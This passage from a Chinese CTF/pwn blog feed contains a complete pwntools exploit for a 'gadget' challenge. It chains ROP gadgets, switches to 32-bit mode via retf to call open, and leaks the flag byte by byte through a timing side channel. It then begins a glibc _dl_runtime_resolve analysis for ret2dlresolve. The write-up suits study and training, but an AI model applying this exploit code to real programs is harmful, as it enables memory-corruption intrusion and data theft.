class="line">payload1+=p64(syscall)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload1+=p64(fake_stack)</span><br><span class="line">sn(io,payload1)</span><br></pre></td></tr></table></figure><p>接下来通过retf转化为32位然后调用open</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">在32位下调用open函数</span></span><br><span class="line"><span class="string">################&#x27;&#x27;&#x27;</span></span><br><span class="line">payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rcx)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">payload2+=p64(flag_path)</span><br><span class="line">payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">5</span>)</span><br><span class="line">payload2+=p64(retf)</span><br><span class="line">payload2+=p32(int_80)</span><br><span class="line">payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再返回64位通过read函数来写flag到bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">返回64位调用read函数写flag到bss一区域</span></span><br><span class="line"><span class="string">################################&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2+=p32(retf)</span><br><span class="line">payload2+=p32(pop_rdi_rbp)</span><br><span class="line">payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">payload2+=p64(<span class="number">3</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">payload2+=p64(read_flag_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(fake_stack)</span><br><span class="line">payload2+=p64(pop_rax)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在此之前的都很简单，困难的是这么测信道攻击，首先我们要知道要进行测信道攻击的话得先找到一个loop指令，这样当我们找到flag对应的字符后可以调转到此死循环中。</p><p>这里我采取的方法是将rax填入jmp rax的地址再调整到jmp rax处从而达到死循环的要求</p><p>那么剩下的条件就只有一个可以判断我们字符的指令了</p><p>我们搜索sub和ret</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220116133910476.png" alt="image-20220116133910476"></p><p>发现有这样一条指令那么只需要搭配jne指令就可以做到我们想要的结果，唯一麻烦的就是得控制写入地址，但是也不算是特别困难的事情。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">   测信道攻击</span></span><br><span class="line"><span class="string">   #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">   payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">   payload2+=p64(rbx_need)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">   payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">   payload2+=p64(jne_ret)</span><br><span class="line">   payload2+=p64(pop_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br><span class="line">   payload2+=p64(jmp_rax)</span><br></pre></td></tr></table></figure><p>最终exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">3</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_offset=<span class="number">56</span></span><br><span class="line">retf = <span class="number">0x4011ed</span></span><br><span class="line">syscall=<span class="number">0x401165</span></span><br><span class="line">int_80=<span class="number">0x4011f3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x401001</span></span><br><span class="line">pop_rdi_rbp = <span class="number">0x401734</span></span><br><span class="line">pop_rsi_r15_rbp = <span class="number">0x401732</span></span><br><span class="line">pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172e</span></span><br><span class="line">pop_r12_pop_r14_pop_r15_pop_rbp = <span class="number">0x40172f</span> </span><br><span class="line">pop_rsp_pop_r14_pop_r15_pop_rbp = <span class="number">0x401730</span></span><br><span class="line">mov_rdx_r12_call_r14 = <span class="number">0x402c07</span></span><br><span class="line">pop_rcx = <span class="number">0x40117b</span></span><br><span class="line">jne_ret = <span class="number">0x408853</span></span><br><span class="line">sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret = <span class="number">0x403f14</span></span><br><span class="line">jmp_rax = <span class="number">0X40107e</span></span><br><span class="line">ret = <span class="number">0x401002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=(bss_addr &amp; <span class="number">0xfffffffffffff000</span>) + <span class="number">0xD00</span> <span class="comment">#open后read的起始位置</span></span><br><span class="line">flag_path=fake_stack-<span class="number">0x10</span> <span class="comment">#open所需要的字符串</span></span><br><span class="line">flag_addr_base=fake_stack - <span class="number">0x200</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">io,off,cha</span>):</span></span><br><span class="line">    <span class="comment">#success(&#x27;bss_addr: &#x27;+hex(bss_addr))</span></span><br><span class="line">    <span class="comment">#success(&#x27;fake_stack: &#x27;+hex(fake_stack))</span></span><br><span class="line">    <span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">    rbx_need=flag_addr_base+cha</span><br><span class="line">    read_flag_addr=rbx_need+<span class="number">0x41</span>-off</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    调用read函数写flag路径 </span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload1 =<span class="string">b&#x27;a&#x27;</span>*stack_offset</span><br><span class="line">    payload1+=p64(pop_rax)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(pop_rdi_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload1+=p64(flag_path)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload1+=p64(syscall)</span><br><span class="line">    payload1+=p64(<span class="number">0</span>)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    payload1+=p64(mov_rdx_r12_call_r14)</span><br><span class="line">    payload1+=p64(pop_rsp_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload1+=p64(fake_stack)</span><br><span class="line">    sn(io,payload1)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################</span></span><br><span class="line"><span class="string">    在32位下调用open函数</span></span><br><span class="line"><span class="string">    ################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2 =<span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rcx)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(flag_path)</span><br><span class="line">    payload2+=p64(<span class="number">0x300</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">5</span>)</span><br><span class="line">    payload2+=p64(retf)</span><br><span class="line">    payload2+=p32(int_80)</span><br><span class="line">    payload2+=p32(<span class="number">0x23</span>)<span class="comment"># $cs=0x23</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;################################</span></span><br><span class="line"><span class="string">    返回64位调用read函数写flag到bss一区域</span></span><br><span class="line"><span class="string">    ################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    payload2+=p32(retf)</span><br><span class="line">    payload2+=p32(pop_rdi_rbp)</span><br><span class="line">    payload2+=p32(<span class="number">0x33</span>)<span class="comment"># $cs=0x33</span></span><br><span class="line">    payload2+=p64(<span class="number">3</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload2+=p64(read_flag_addr)</span><br><span class="line">    </span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(fake_stack)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    payload2+=p64(syscall)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;#################################</span></span><br><span class="line"><span class="string">    测信道攻击</span></span><br><span class="line"><span class="string">    #################################&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload2+=p64(pop_rbx_pop_r12_pop_r14_pop_r15_pop_rbp)</span><br><span class="line">    payload2+=p64(rbx_need)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    payload2+=p64(sub_rbx_0x41_bl_pop_rsi_pop_r15_pop_rbp_ret)</span><br><span class="line">    payload2+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload2+=p64(jne_ret)</span><br><span class="line">    payload2+=p64(pop_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line">    payload2+=p64(jmp_rax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(io,payload2)</span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        strl=<span class="string">&quot;现在是第&quot;</span>+<span class="built_in">str</span>(off)+<span class="string">&quot;位&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(strl)</span><br><span class="line">        <span class="keyword">for</span> cha <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">            io=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                exp(io,off,cha)</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(cha)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>+flag)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(cha)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    pause()</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="Dataleak"><a href="#Dataleak" class="headerlink" title="Dataleak"></a>Dataleak</h2><p>我们可以看到这里的v6里储存的是我们想要的flag。我们只需要想办法将其泄露出来就好了。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135703799.png" alt="image-20220117135703799"></p><p>可以看到这里是有打印函数，但是打印的范围是小于v5的内存大小的，就算v5没有截止符，这里也是没办法泄露出flag的。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135836681.png" alt="image-20220117135836681"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117135625231.png" alt="image-20220117135625231"></p><p>那么可能有问题的地方就在write之前调用的函数了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20220117144031745.png" alt="image-20220117144031745"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于_dl_runtime_resolve分析与ret2dlresolve</title>
      <link href="/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/"/>
      <url>/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结了静态链接和动态链接的过程，这次我们要真正讨论一下ret2dl的攻击方法。在此之前我们需要把_dl_runtime_resolve进行一下分析。</p><h1 id="dl-runtime-resolve分析"><a href="#dl-runtime-resolve分析" class="headerlink" title="_dl_runtime_resolve分析"></a>_dl_runtime_resolve分析</h1><p>我在网上查到资料是这个函数在<em>\sysdeps\x86_64\dl-trampoline.S</em>路径里。但是里面没有找该函数的代码实现，我又看了看他的头文件，实际上的代码的实现是保存在<em>\sysdeps\x86_64\dl-trampoline.h</em>里。代码是用汇编实现的，</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.hidden</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line">cfi_startproc</span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">16</span>) # Incorporate PLT</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"># if LOCAL_STORAGE_AREA != <span class="number">8</span></span><br><span class="line">#  error LOCAL_STORAGE_AREA must be <span class="number">8</span></span><br><span class="line"># endif</span><br><span class="line">pushq %rbx# <span class="keyword">push</span> subtracts stack by <span class="number">8</span>.</span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">8</span>)</span><br><span class="line">cfi_rel_offset(%rbx, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">mov</span> %RSP_LP, %RBX_LP</span><br><span class="line">cfi_def_cfa_register(%rbx)</span><br><span class="line"><span class="keyword">and</span> $-VEC_SIZE, %RSP_LP</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">sub</span> $REGISTER_SAVE_AREA, %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(REGISTER_SAVE_AREA)</span><br><span class="line"># Preserve registers otherwise clobbered.</span><br><span class="line"><span class="keyword">movq</span> %rax, REGISTER_SAVE_RAX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rcx, REGISTER_SAVE_RCX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdx, REGISTER_SAVE_RDX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rsi, REGISTER_SAVE_RSI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdi, REGISTER_SAVE_RDI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r8, REGISTER_SAVE_R8(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r9, REGISTER_SAVE_R9(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">0</span>), (REGISTER_SAVE_VEC_OFF)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">1</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">2</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">3</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">4</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">5</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">6</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">7</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp)</span><br><span class="line">#ifndef __ILP32__</span><br><span class="line"># We also have to preserve <span class="keyword">bound</span> registers.  These are nops if</span><br><span class="line"># Intel MPX isn<span class="string">&#x27;t available or disabled.</span></span><br><span class="line"><span class="string"># ifdef HAVE_MPX_SUPPORT</span></span><br><span class="line"><span class="string">bndmov %bnd0, REGISTER_SAVE_BND0(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd1, REGISTER_SAVE_BND1(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd2, REGISTER_SAVE_BND2(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd3, REGISTER_SAVE_BND3(%rsp)</span></span><br><span class="line"><span class="string"># else</span></span><br><span class="line"><span class="string">#  if REGISTER_SAVE_BND0 == 0</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x04,0x24</span></span><br><span class="line"><span class="string">#  else</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x44,0x24,REGISTER_SAVE_BND0</span></span><br><span class="line"><span class="string">#  endif</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x4c,0x24,REGISTER_SAVE_BND1</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x54,0x24,REGISTER_SAVE_BND2</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x5c,0x24,REGISTER_SAVE_BND3</span></span><br><span class="line"><span class="string"># endif</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"># Copy args pushed by PLT in register.</span></span><br><span class="line"><span class="string"># %rdi: link_map, %rsi: reloc_index</span></span><br><span class="line"><span class="string">mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP</span></span><br><span class="line"><span class="string">mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP</span></span><br><span class="line"><span class="string">call _dl_fixup# Call resolver.</span></span><br><span class="line"><span class="string">mov %RAX_LP, %R11_LP# Save return value</span></span><br><span class="line"><span class="string">#ifndef __ILP32__</span></span><br><span class="line"><span class="string"># Restore bound registers.  These are nops if Intel MPX isn&#x27;</span>t</span><br><span class="line"># avaiable <span class="keyword">or</span> disabled.</span><br><span class="line"># ifdef HAVE_MPX_SUPPORT</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND3(%rsp), %bnd3</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND2(%rsp), %bnd2</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND1(%rsp), %bnd1</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND0(%rsp), %bnd0</span><br><span class="line"># else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x5c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND3</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x54</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND2</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND1</span><br><span class="line">#  if REGISTER_SAVE_BND0 == <span class="number">0</span></span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x04</span>,<span class="number">0x24</span></span><br><span class="line">#  else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND0</span><br><span class="line">#  endif</span><br><span class="line"># endif</span><br><span class="line">#endif</span><br><span class="line"># Get register content back.</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R9(%rsp), %r9</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R8(%rsp), %r8</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDI(%rsp), %rdi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RSI(%rsp), %rsi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDX(%rsp), %rdx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RCX(%rsp), %rcx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RAX(%rsp), %rax</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF)(%rsp), %VEC(<span class="number">0</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp), %VEC(<span class="number">1</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp), %VEC(<span class="number">2</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp), %VEC(<span class="number">3</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp), %VEC(<span class="number">4</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp), %VEC(<span class="number">5</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp), %VEC(<span class="number">6</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp), %VEC(<span class="number">7</span>)</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"><span class="keyword">mov</span> %RBX_LP, %RSP_LP</span><br><span class="line">cfi_def_cfa_register(%rsp)</span><br><span class="line"><span class="keyword">movq</span> (%rsp), %rbx</span><br><span class="line">cfi_restore(%rbx)</span><br><span class="line">#endif</span><br><span class="line"># Adjust stack(PLT did <span class="number">2</span> pushes)</span><br><span class="line"><span class="keyword">add</span> $(LOCAL_STORAGE_AREA + <span class="number">16</span>), %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(-(LOCAL_STORAGE_AREA + <span class="number">16</span>))</span><br><span class="line"># Preserve <span class="keyword">bound</span> registers.</span><br><span class="line">PRESERVE_BND_REGS_PREFIX</span><br><span class="line"><span class="keyword">jmp</span> *%r11# Jump to function address.</span><br><span class="line">cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>这段代码的功能就是保存寄存器的值到栈里,然后调用_dl_fixup执行具体功能，然后从栈中恢复寄存器。而调用_dl_fixup传入的参数rdi是link_map,rsi是GOT中关于PLT重定位的索引，后面根据该索引寻找要传入的新地址。所以分析_dl_fixup对我们了解_dl_runtime_resolve是非常重要的。</p><h2 id="dl-fixup分析"><a href="#dl-fixup分析" class="headerlink" title="_dl_fixup分析"></a>_dl_fixup分析</h2><p>_dl_fixup是定义和实现是在\elf\dl-runtime.c中，先来分析一下代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">//通过宏D_PTR获取获得动态链接符号表的地址，既得到.dynsym的指针。</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//通过宏D_PTR获取获得动态链接字符串的地址，既得到.dynstr的指针。</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offset就是传进来的第二个参数，GOT中关于PLT重定位的索引，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针。</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</span></span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//l-&gt;l_addr保存的是共享文件加载的基地址。这里的rel_addr是基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"><span class="comment">//这里是检查r_info中的重定位入口类型是否是R_386_JMP_SLOT,动态链接中函数重定位一般都为R_386_JMP_SLOT，也就是7</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span 